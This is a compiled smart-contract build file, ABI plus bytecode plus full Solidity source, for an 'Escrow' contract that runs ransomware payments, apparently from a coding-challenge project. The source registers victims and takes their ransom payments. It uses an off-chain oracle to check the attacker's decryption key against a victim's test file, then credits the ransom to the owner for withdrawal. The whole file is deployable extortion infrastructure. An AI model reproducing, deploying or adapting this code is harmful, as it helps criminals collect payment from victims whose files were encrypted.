{
  "contractName": "Escrow",
  "abi": [
    {
      "inputs": [
        {
          "name": "_registry",
          "type": "address"
        },
        {
          "name": "_oracleAccount",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "id",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "encKey",
          "type": "string"
        },
        {
          "indexed": false,
          "name": "encFile",
          "type": "string"
        }
      ],
      "name": "DecryptEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "id",
          "type": "uint256"
        },
        {
          "indexed": true,
          "name": "result",
          "type": "bool"
        }
      ],
      "name": "DecryptCallbackEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "id",
          "type": "uint256"
        },
        {
          "indexed": true,
          "name": "result",
          "type": "bool"
        }
      ],
      "name": "AuthCallbackEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "id",
          "type": "uint256"
        }
      ],
      "name": "BadPaymentEvent",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "ransomAmount",
          "type": "uint256"
        },
        {
          "name": "victimId",
          "type": "uint256"
        },
        {
          "name": "victimAddr",
          "type": "address"
        }
      ],
      "name": "registerRansom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "ransomAddr",
          "type": "address"
        },
        {
          "name": "authResult",
          "type": "bool"
        }
      ],
      "name": "authCallback",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "encFile",
          "type": "string"
        }
      ],
      "name": "payRansom",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "requestRefund",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "encKey",
          "type": "string"
        }
      ],
      "name": "decryptKey",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "decKey",
          "type": "bytes32"
        },
        {
          "name": "authResult",
          "type": "bool"
        }
      ],
      "name": "decryptCallback",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        }
      ],
      "name": "getDecryptionKey",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "account",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdrawFunds",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "die",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405160408061188d8339810180604052810190808051906020019092919080519060200190929190505050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600060018190555081600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050611775806101186000396000f300608060405260043610610098576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062e6652a1461009a57806335f46994146100e9578063444921e6146101005780634a51ae03146101575780636911665c146101a0578063a5fc2936146101d8578063c10753291461021f578063e078891d14610284578063e1bf0eb7146102c9575b005b3480156100a657600080fd5b506100cf6004803603810190808035906020019092919080359060200190929190505050610322565b604051808215151515815260200191505060405180910390f35b3480156100f557600080fd5b506100fe6104fd565b005b34801561010c57600080fd5b506101556004803603810190808035906020019092919080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506106cf565b005b34801561016357600080fd5b50610182600480360381019080803590602001909291905050506108b9565b60405180826000191660001916815260200191505060405180910390f35b6101d6600480360381019080803590602001909291908035906020019082018035906020019190919293919293905050506109b5565b005b3480156101e457600080fd5b5061021d600480360381019080803590602001909291908035600019169060200190929190803515159060200190929190505050610cd0565b005b34801561022b57600080fd5b5061026a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611020565b604051808215151515815260200191505060405180910390f35b34801561029057600080fd5b506102c76004803603810190808035906020019092919080359060200190820180359060200191909192939192939050505061115c565b005b3480156102d557600080fd5b5061032060048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803515159060200190929190505050611484565b005b600080836004600082815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103ff576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f4f6e6c79207468652056696374696d2063616e2063616c6c207468697300000081525060200191505060405180910390fd5b6003600086815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915060008273ffffffffffffffffffffffffffffffffffffffff1611801561046e575083600760008781526020019081526020016000205410155b801561047a5750600084115b156104f0578360076000878152602001908152602001600020600082825403925050819055508173ffffffffffffffffffffffffffffffffffffffff166108fc859081150290604051600060405180830381858888f193505050501580156104e6573d6000803e3d6000fd5b50600192506104f5565b600092505b505092915050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156105c3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601c8152602001807f4f6e6c7920746865204f776e65722063616e2063616c6c20746869730000000081525060200191505060405180910390fd5b600090505b600980549050811015610695576009818154811015156105e457fe5b9060005260206000200160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166335f469946040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561067257600080fd5b505af1158015610686573d6000803e3d6000fd5b505050508060010190506105c8565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b336000600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541115156107ad576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260318152602001807f4f6e6c792061757468656e746963617465642052616e736f6d20636f6e74726181526020017f6374732063616e2063616c6c207468697300000000000000000000000000000081525060400191505060405180910390fd5b6080604051908101604052808481526020018581526020018373ffffffffffffffffffffffffffffffffffffffff1681526020013373ffffffffffffffffffffffffffffffffffffffff1681525060046000858152602001908152602001600020600082015181600001556020820151816001015560408201518160020160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060608201518160030160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555090505050505050565b6000336000600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054111515610999576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260318152602001807f4f6e6c792061757468656e746963617465642052616e736f6d20636f6e74726181526020017f6374732063616e2063616c6c207468697300000000000000000000000000000081525060400191505060405180910390fd5b6005600084815260200190815260200160002054915050919050565b600080846004600082815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610a92576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f4f6e6c79207468652056696374696d2063616e2063616c6c207468697300000081525060200191505060405180910390fd5b6004600087815260200190815260200160002092508260030160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915082600101543410158015610b7e57508173ffffffffffffffffffffffffffffffffffffffff1663ef67c10f6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b158015610b4157600080fd5b505af1158015610b55573d6000803e3d6000fd5b505050506040513d6020811015610b6b57600080fd5b8101908080519060200190929190505050155b15610c9a573460076000888152602001908152602001600020600082825401925050819055508484600860008981526020019081526020016000209190610bc692919061165c565b50336003600088815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff16632f67b7c56040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b158015610c7d57600080fd5b505af1158015610c91573d6000803e3d6000fd5b50505050610cc8565b857f86cbf2a9edfbbad48bcd7988364e07caa9a4a40892cdbab87d009e9403aac0b460405160405180910390a25b505050505050565b6000600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610d97576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f4f6e6c7920746865204f7261636c652063616e2063616c6c207468697300000081525060200191505060405180910390fd5b60006008600086815260200190815260200160002080546001816001161561010002031660029004905014151515610e37576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f6d697373696e6720656e637279707465642066696c650000000000000000000081525060200191505060405180910390fd5b600860008581526020019081526020016000206000610e5691906116dc565b82600560008681526020019081526020016000208160001916905550811515847f4bf2880b71bbce427eacceef4a0ee8911ef5ff85a993136744f98ecaceb4892e60405160405180910390a3600460008581526020019081526020016000209050806001015460076000868152602001908152602001600020600082825403925050819055508115610f9b5780600101546001600082825401925050819055508060030160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663878a0db76040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b158015610f7e57600080fd5b505af1158015610f92573d6000803e3d6000fd5b5050505061101a565b6003600085815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc82600101549081150290604051600060405180830381858888f19350505050158015611018573d6000803e3d6000fd5b505b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156110e6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601c8152602001807f4f6e6c7920746865204f776e65722063616e2063616c6c20746869730000000081525060200191505060405180910390fd5b8160015410151561115157816001600082825403925050819055508273ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015611147573d6000803e3d6000fd5b5060019050611156565b600090505b92915050565b336000600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411151561123a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260318152602001807f4f6e6c792061757468656e746963617465642052616e736f6d20636f6e74726181526020017f6374732063616e2063616c6c207468697300000000000000000000000000000081525060400191505060405180910390fd5b838060046000838152602001908152602001600020600001541415156112c8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f56696374696d206964206d757374206265206b6e6f776e00000000000000000081525060200191505060405180910390fd5b600460008281526020019081526020016000206001015460076000838152602001908152602001600020541015151561138f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001807f4f6e6c792076616c69642069662056696374696d20686173207061696420726181526020017f6e736f6d0000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b847fc17195a10e83b996d2610d88f75a436776867170bc4a1c67e8af422a0e360ade8585600860008a81526020019081526020016000206040518080602001806020018381038352868682818152602001925080828437820191505083810382528481815460018160011615610100020316600290048152602001915080546001816001161561010002031660029004801561146c5780601f106114415761010080835404028352916020019161146c565b820191906000526020600020905b81548152906001019060200180831161144f57829003601f168201915b50509550505050505060405180910390a25050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561156f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260288152602001807f4f6e6c792074686520526567697374727920636f6e74726163742063616e206381526020017f616c6c207468697300000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b801515837fbcb5c08676431aa636a2d6ad86fa4fb3d975c09cd4439d2d3e2b6a781f58f2d160405160405180910390a36001151581151514156116575782600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060098290806001815401808255809150509060018203906000526020600020016000909192909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505b505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061169d57803560ff19168380011785556116cb565b828001600101855582156116cb579182015b828111156116ca5782358255916020019190600101906116af565b5b5090506116d89190611724565b5090565b50805460018160011615610100020316600290046000825580601f106117025750611721565b601f0160209004906000526020600020908101906117209190611724565b5b50565b61174691905b8082111561174257600081600090555060010161172a565b5090565b905600a165627a7a7230582098d7c3df51651ab994bc4ff64cb2de77ddfe4e5c2eb7f85d9473032cd5d245b10029",
  "source": "pragma solidity ^0.4.24;\n\nimport \"./Ransom.sol\";\nimport \"./Registry.sol\";\n\n///@title Escrow Contract\ncontract Escrow {\n    /**\n     * @dev The Escrow contract governs the payment process and release of the decryption key. It is meant to\n     * provide the victim assurances that they will receive a valid key in return for payment of the ransom. There can be \n     * many Ransom contracts registered with each Escrow contract, so while there is a unique Ransom contract for each\n     * victim there can be many victims associated with a single Escrow contract. Keeping track of everything is a\n     * single Registry contract. There is one and only one Registry and it maintains records of all the victims and the\n     * associated Ransom and Escrow contracts.\n     *\n     * When a victim submits their payment, the Escrow contract will request a copy of the encryption key from the\n     * Ransom contract. The victim also submits an encrypted file that is used to test that the key provided by\n     * the Ransom contract actually works. The decryption and authentication of the provided key happens off-chain \n     * by an Oracle. The Oracle monitors the blockchain for decryption events and when one is received, it uses its \n     * private key to unwrap the ransom key and attempt to decrypt (and authenticate) the file provided by the victim. \n     * If this process succeeds, it calls the decryptCallback function and returns a copy of the unwrapped key. \n     * If the process fails, no key is returned and the victim is automatically refunded their ransom payment. \n     * The Oracle is also what handles the authentication events that are triggered when new Ransom contracts get \n     * deployed and attempt to register with the Registry contract.\n     */\n\n    ///@dev Victim struct used to keep track of their contract details\n    struct Victim {\n        uint id;            //!< The unique ID of the victim\n        uint ransomAmount;  //!< The ransom amount the victim is required to pay\n        address victimAddr; //!< The account address belonging to the victim\n        address ransomAddr; //!< The address of the victim's Ransom contract\n    }\n\n    ///@dev The DecryptEvent is triggered when the victim has paid the ransom and provided an encrypted test file. The\n    ///off-chain decryption Oracle watches for this event and will attempt to unwrap the encryption key using its private\n    ///key, decrypt and authenticate the test file, and provide the results back to the Escrow contract.\n    event DecryptEvent(\n        uint indexed id,    //!< The unique ID of the victim\n        string encKey,      //!< The encrypted key provided by the Ransom contract\n        string encFile      //!< The encrypted test file (provided by the victim) \n    );\n\n    ///@dev The DecryptCallbackEvent is triggered when the off-chain decryption Oracle calls the decryptCallback function\n    event DecryptCallbackEvent(\n        uint indexed id,        //!< The unique ID of the victim\n        bool indexed result     //!< The result of the decryption \n    );\n\n    ///@dev The AuthCallbackEvent is triggered when the Registry contract calls the authCallback function\n    event AuthCallbackEvent(\n        uint indexed id,        //!< The unique ID of the victim\n        bool indexed result     //!< The result of the authentication\n    );\n\n    ///@dev The BadPaymentEvent is triggered when the victim pays but a key is not requested.\n    event BadPaymentEvent(\n        uint indexed id        //!< The unique ID of the victim\n    );\n\n    address owner;      //!< This is the account that deployed the Escrow contract\n    uint ownerBalance;  //!< This is the account balance of the owner (i.e., fulfilled ransoms)\n    address registry;   //!< This is the address of the Registry contract\n    mapping(uint => address) vicToPayerMap; //!< Mapping from victim IDs to the account addresses that submitted payment\n    mapping(uint => Victim) victimMap;      //!< Mapping from victim IDs to Victim structs\n    mapping(uint => bytes32) decKeyMap;      //!< Mapping from victim IDS to decrypted ransom keys\n    mapping(address => uint) ransomMap;     //!< Mapping from Ransom contract addresses to victim IDs\n    mapping(uint => uint) escrowMap;        //!< Mapping from victim IDs to the amount of ransom payment received\n    mapping(uint => string) encFileMap;     //!< Mapping from victim IDs to encrypted test files\n    address[] ransomContracts;              //!< List of Ransom contracts registered with this Escrow contract\n    address oracleAccount;  //!< Address of the off-chain authentication and decryption Oracle\n\n    ///@dev Restricts that the caller must be the Oracle account\n    modifier restrictSenderToOracle {\n        require(msg.sender == oracleAccount, \"Only the Oracle can call this\");\n        _;\n    }\n\n    ///@dev Restricts that the caller must be the owner account\n    modifier restrictSenderToOwner {\n        require(msg.sender == owner, \"Only the Owner can call this\");\n        _;\n    }\n\n    ///@dev Restricts that the caller must be the Registry contract\n    modifier restrictSenderToRegistry {\n        require(msg.sender == registry, \"Only the Registry contract can call this\");\n        _;\n    }\n\n    ///@dev Restricts that a transaction must have originated with the victim account\n    modifier restrictSenderToVictim(uint id) {\n        require(msg.sender == victimMap[id].victimAddr, \"Only the Victim can call this\");\n        _;\n    }\n\n    ///@dev Restricts that the Ransom contract address has been authenticated\n    modifier onlyAuthenticated(address ransom) {\n        require(ransomMap[ransom] > 0, \"Only authenticated Ransom contracts can call this\");\n        _;\n    }\n\n    ///@dev Restricts that the victim has paid the ransom amount\n    modifier hasPaidRansom(uint id) {\n        require(victimMap[id].id == id, \"Victim id must be known\");\n        require(escrowMap[id] >= victimMap[id].ransomAmount, \"Only valid if Victim has paid ransom\");\n        _;\n    }\n\n    /**\n     * @dev Escrow constructor\n     * @param _registry address of the Registry contract\n     * @param _oracleAccount address of the off-chain oracle \n     */\n    constructor(address _registry, address _oracleAccount) public {\n        owner = msg.sender;\n        ownerBalance = 0;\n        registry = _registry;\n        oracleAccount = _oracleAccount;\n    }\n\n    /**\n     * @dev Adds a victim to the victimMap. This is only allowed to be called by an authenticated Ransom contract\n     * @param ransomAmount the amount the victim must pay\n     * @param victimId the unique ID of the victim\n     * @param victimAddr the account address belonging to the victim\n     */\n    function registerRansom(uint ransomAmount, uint victimId, address victimAddr) external onlyAuthenticated(msg.sender)  { \n        victimMap[victimId] = Victim(victimId, ransomAmount, victimAddr, msg.sender);\n    }\n\n    /**\n     * @dev Authentication callback function. This is restricted such that the caller must be the Registry contract.\n     * @param id the unique ID of the victim\n     * @param ransomAddr the address of the Ransom contract\n     * @param authResult indicates whether authentication was successful\n     */\n    function authCallback(uint id, address ransomAddr, bool authResult) external restrictSenderToRegistry  {        \n        emit AuthCallbackEvent(id, authResult);\n        \n        if (authResult == true) {\n            ransomMap[ransomAddr] = id;\n            ransomContracts.push(ransomAddr);\n        }\n    }\n   \n    /**\n     * @dev This is the function that victims will call and submit their ransom payment\n     * @param id the unique ID of the victim\n     * @param encFile the encrypted test file chosen by the victim\n     */\n    function payRansom(uint id, string encFile) external restrictSenderToVictim(id) payable {\n        Victim storage vicInfo = victimMap[id];\n        Ransom ransom = Ransom(vicInfo.ransomAddr);\n\n        if (msg.value >= vicInfo.ransomAmount && !ransom.isFulFilled()) {\n            \n            escrowMap[id] += msg.value;\n            encFileMap[id] = encFile;\n            vicToPayerMap[id] = msg.sender;\n            ransom.requestKey(); \n        } else {\n            emit BadPaymentEvent(id);\n        }\n    }\n\n    /**\n     * @dev This function may be called by victims to receive a refund of money paid into Escrow\n     * @param id the unique ID of the victim\n     * @param amount the amount of refund requested\n     * @return bool true if the amount requested is <= the amount the victim has paid\n     */\n    function requestRefund(uint id, uint amount) external restrictSenderToVictim(id) returns (bool) {\n        address payer = vicToPayerMap[id];\n        if (payer > 0 && escrowMap[id] >= amount && amount > 0) {\n            escrowMap[id] -= amount;\n            payer.transfer(amount);\n            return true;\n        }\n        return false;\n    }\n    \n    /**\n     * @dev This function is called by the Ransom contract after the victim has paid the ransom. It emits the\n     * DecryptEvent for the off-chain Oracle to process.\n     * @param id the unique ID of the victim\n     * @param encKey the wrapped encryption key held by the Ransom contract\n     */\n    function decryptKey(uint id, string encKey) external onlyAuthenticated(msg.sender) hasPaidRansom(id) {\n        emit DecryptEvent(id, encKey, encFileMap[id]);\n    }\n\n    /**\n     * @dev This function is called by the off-chain Oracle after it has processed the DecryptEvent. If authResult is true,\n     * then the contract owner's balance increases by the ransom amount. Otherwise, the victim gets their money back.\n     * @param id the unique ID of the victim\n     * @param decKey the unwrapped encryption key (or empty string if authResult is false)\n     * @param authResult true/false if whether decryption and authentication succeeded\n     */\n    function decryptCallback(uint id, bytes32 decKey, bool authResult) external restrictSenderToOracle {\n        require(bytes(encFileMap[id]).length != 0, \"missing encrypted file\");\n        delete encFileMap[id]; // no longer needed\n\n        decKeyMap[id] = decKey;\n        emit DecryptCallbackEvent(id, authResult);\n\n        Victim storage vicInfo = victimMap[id];\n        escrowMap[id] -= vicInfo.ransomAmount;\n\n        if (authResult) {\n            ownerBalance += vicInfo.ransomAmount;\n            Ransom(vicInfo.ransomAddr).fulfillContract();\n        } else {\n            vicToPayerMap[id].transfer(vicInfo.ransomAmount); \n        }\n\n    }\n\n    /**\n     * @dev This function returns the unwrapped encryption key (or empty string if ransom hasn't been fulfilled)\n     * @param id the unique ID of the victim\n     * @return string the unwrapped encryption key\n     */\n    function getDecryptionKey(uint id) external onlyAuthenticated(msg.sender) view returns (bytes32) {\n        return decKeyMap[id];\n    } \n\n    /**\n     * @dev Enables the contract owner to withdraw funds from the contract\n     * @param account the account address to transfer funds to\n     * @param amount the amount of funds to transfer\n     * @return bool true if the owner has the requested amount of funds\n     */\n    function withdrawFunds(address account, uint amount) external restrictSenderToOwner returns (bool) {\n        if (ownerBalance >= amount) {\n            ownerBalance -= amount;\n            account.transfer(amount);\n            return true;\n        }\n        return false;\n    }\n\n    /**\n     * @dev Self-destructs this contract and all associated Ransom contracts\n     */\n    function die() external restrictSenderToOwner {\n        for (uint i = 0; i < ransomContracts.length; ++i) {\n            Ransom(ransomContracts[i]).die();\n        }\n        selfdestruct(owner);\n    }\n\n    /**\n     * @dev payable fallback function to receive \"donations\"\n     */\n    function () payable public {\n        \n    }\n}\n",
  "sourcePath": "/Users/vkorolev/Proj/mine/tla/tla-challenge-18/task-6/contracts/Escrow.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.0.0-beta.1",
  "updatedAt": "2018-12-28T20:58:23.757Z"
}